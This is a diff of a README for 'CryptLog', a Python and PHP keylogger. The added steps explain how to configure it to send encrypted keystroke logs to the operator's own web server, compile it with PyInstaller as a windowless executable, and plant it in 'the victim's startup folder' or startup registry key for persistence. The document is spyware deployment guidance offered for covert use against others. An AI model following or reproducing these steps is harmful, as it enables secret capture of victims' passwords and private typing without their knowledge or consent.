@@ -1,2 +1,24 @@
 A simple keylogger made in Python and PHP.
-More README goodness to come soon ^^
+
+Here's what you need to do to start logging keystrokes:
+
+1.) Download PyHook.
+2.) Edit the "cryptlog.py" file.
+   a.) replace "thisiswhereyourkeygoes" with whatever key you want to encrypt the data with.
+   b.) Change "http://www.yoursite.com/droplogs.php" to whatever your site is. (Need a good freehost?  Check out x10 hosting. "http://www.x10hosting.com/")
+3.) Edit the "viewlogs.py" file.
+   a.) Change "http://www.yoursite.com/" to the name of your site.
+4.) Edit the "droplogs.php" file.
+   a.) Change "keyloggerlogfiles.txt" to the name of the file you want to keep logs in.
+5.) Upload "droplogs.php" to your site.
+6.) Compile the file(s).
+   a.) Download "Pyinstaller 2.0" (http://www.pyinstaller.org/)
+   b.) Run "python pyinstaller.py -F --name=Cryptlog -w path\to\cryptlog.py" where "path\to\cryptlog.py" is the relitive path pointing to cryptlog.py.  You *MUST* run this in PyInstaller's directory.
+   c.) *OPTIONAL*   Run "python pyinstaller.py -F --name=Viewlogs path\to\viewlogs.py" where "path\to\viewlogs.py" is the relitive path pointing to viewlogs.py.  You *MUST* run this in PyInstaller's directory.
+7.) Put "Cryptlog.exe" into the victim's startup folder, or, better yet, into the startup registry key.
+8.) Run "Viewlogs.exe" or "viewlogs.py" and type in the name of the logfile that you set in setp 3a.  Then, type in the ID of the log that you want to view.  Each time Cryptlog.exe starts up, it creates a new log with a new ID.  Next, type in what you used as your key in step 1a.  From there, you should be able to view the logs of the keystrokes.
+9.) *OPTIONAL* Send me an email telling me how much you love/hate CryptLog.  My email (or, rather, the Evil Ninja Hackers email) is "ENH@lavabit.com"
+
+Have fun,
+
+The Evil Ninja Hackers.
